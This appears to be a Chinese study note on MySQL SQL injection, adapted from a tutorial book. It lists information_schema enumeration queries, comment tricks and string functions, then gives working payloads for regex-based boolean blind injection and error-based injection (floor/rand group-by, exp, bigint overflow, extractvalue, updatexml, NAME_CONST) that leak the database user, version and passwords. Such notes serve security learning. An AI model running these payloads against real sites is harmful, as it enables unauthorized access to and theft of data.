I"<p>P.S.本文整理自《sql注入天书》，部分内容摘抄自这本书，加以小修改，和一些注解，记录下自己在学习过程中遇到的坑。</p>

<hr />
<h1 id="数据库">数据库</h1>

<h2 id="关于系统数据库information_schema">关于系统数据库<code>information_schema</code></h2>
<p>所有数据库：<code>select schema_name from information_schema.schemata;</code>
xxx数据库里的所有数据表：<code>select table_name from information_schema.tables where table_schema="xxx";</code>
xxx表里面所有列：<code>select column_name from information_schema.columns where table_name="xxx";</code></p>

<h1 id="语法">语法</h1>

<h2 id="几种注释">几种注释</h2>
<ol>
  <li><code>#bla...</code></li>
  <li><code>bla--+blabla...</code>
这里<code>--</code>的作用与<code>#</code>基本相同，不同的是<code>--</code>后面必须有一个空格，众所周知，在url编码里，空格常被<code>+</code>代替为了避免空格被地址栏忽略，可能就是我们把空格打成<code>+</code>（我猜的）。</li>
  <li><code>/*bla...*/</code></li>
</ol>

<h2 id="整型列的查询不需要闭合单引号">整型列的查询不需要闭合单引号</h2>
<p>sql查询时如果要判断某个整数列比如<code>id</code>为某个数时，引号不需要闭合，<code>select *** from *** where id=1</code>，<code>select *** from *** where id="1"</code>，<code>select *** from *** where id="1'"</code>所得到的结果是一样的！</p>

<h1 id="函数">函数</h1>

<h2 id="系统函数">系统函数</h2>
<p>几个常用函数:</p>
<ol>
  <li><code>version()</code>——MySQL 版本</li>
  <li><code>user()</code>——数据库用户名</li>
  <li><code>database()</code>——数据库名</li>
  <li><code>@@datadir</code>——数据库路径</li>
  <li><code>@@version_compile_os</code>——操作系统版本</li>
</ol>

<h2 id="字符串">字符串</h2>

<h3 id="连接">连接</h3>
<ol>
  <li><code>concat(str1,str2,...)</code>——没有分隔符地连接字符串</li>
  <li><code>concat_ws(separator,str1,str2,...)</code>——含有分隔符地连接字符串</li>
  <li><code>group_concat(str1,str2,...)</code>——连接一个组的所有字符串,并以逗号分隔每一条数据说着比较抽象,其实也并不需要详细了解,知道这三个函数能一次性查出所有信息就行了。</li>
</ol>

<h3 id="截断">截断</h3>
<p>以下所有字符参数可以为sql查询语句</p>
<ol>
  <li>left(a,b)从左侧截取 a 的前 b 位</li>
  <li>mid(a,b,c) 或者 substr(a,b,c)从 b 位置开始,截取字符串 a 的 c 长度。</li>
  <li>ascii() 或者 ord() 将字符转换为ascii码。</li>
</ol>

<h3 id="检查是否匹配正则表达式">检查是否匹配正则表达式</h3>
<pre><code class="language-sql">字符串 regexp '正则表达式'
</code></pre>

<h2 id="sql注入">sql注入</h2>

<h3 id="基于正则的布尔盲注">基于正则的布尔盲注</h3>

<h4 id="如何返回正则匹配结果">如何返回正则匹配结果</h4>
<p>判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</p>
<pre><code class="language-sql">?id=1 and 1=(select 1 from information_schema.tables where table_schema="blind_sqli" and table_name regexp '^[a-z]' limit 0,1)--+
</code></pre>
<p>如果存在<code>table_name</code>符合要求那么<code>limit 0,1</code>就会将结果变成符合要求的第一个表，经过<code>select 1</code>这一列，会返回<code>1</code>进而与左边相等。
而如果没有符合要求的表名，那么右边就会是<code>empty set</code>了，与左边不想等。
同时，由于每个数据库会有多个表，如apps与access就都以a开头，那么我怎么知道以a开头的有几个呢？只需调整为<code>limit 1,1</code>看看能否成功选取匹配的第二张表名即可。</p>

<h4 id="猜表名的过程二分">猜表名的过程——二分</h4>
<p>以下是猜表名第一位的过程中，前文sql语句中正则表达式的变化及查询的返回结果。</p>
<pre><code>^[a-z]-&gt;true	#说明是字母
^[a-m]-&gt;false	#说明在n-z里
^[n-t]-&gt;false	#说明在u-z里
^[u-w]-&gt;true	#说明在u-w里
^[u-v]-&gt;false	#说明是w

接下来按类似方法尝试
^w[a-z]
...以此类推
</code></pre>

<h3 id="基于报错的-sql-盲注">基于报错的 SQL 盲注</h3>
<pre><code class="language-sql">Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
</code></pre>
<blockquote>
  <p>注释：
这里的<code>concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a</code>意思其实是跟<code>concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) as a</code>一样的！
这种注入方法原理：<a href="https://blog.csdn.net/qq_35544379/article/details/77453019">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p>
</blockquote>

<p>//explain:此处有三个点,一是需要 concat 计数,二是 floor,取得 0 or 1,进行数据的重复,三是 group by 进行分组,但具体原理解释不是很通,大致原理为分组后数据计数时重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0),rand()需要多试几次才行。
以上语句可以简化成如下的形式。</p>
<pre><code class="language-sql">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
</code></pre>
<p>如果关键的表被禁用了,可以使用这种形式</p>
<pre><code class="language-sql">select count(*) from select !1) group by (select 1 union select null union concat(version(),floor(rand(0)*2))
</code></pre>
<p>如果 rand 被禁用了可以使用用户变量来报错</p>
<pre><code class="language-sql">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
</code></pre>
<hr />
<pre><code class="language-sql">select exp(~(select * FROM(SELECT USER())a))
</code></pre>
<p>//double 数值类型超出范围
//Exp()为以 e 为底的对数函数;版本在 5.5.5 及其以上
可以参考 exp 报错文章:<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
<pre><code class="language-sql">select !(select * from (select user())x) -(ps:这是减号) ~0
</code></pre>
<p>//bigint 超出范围;~0 是对 0 逐位取反,很大的版本在 5.5.5 及其以上
20Mysql 注入—sqlilabs—lcamry
可以参考文章 bigint 溢出文章 <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
<pre><code class="language-sql">select extractvalue(1,concat(0x7e,(select @@version),0x7e));
</code></pre>
<p>//mysql 对 xml 数据进行查询和修改的 xpath 函数,xpath 语法错误</p>
<pre><code class="language-sql">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
</code></pre>
<p>//mysql 对 xml 数据进行查询和修改的 xpath 函数,xpath 语法错误</p>
<pre><code class="language-sql">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
</code></pre>
:ET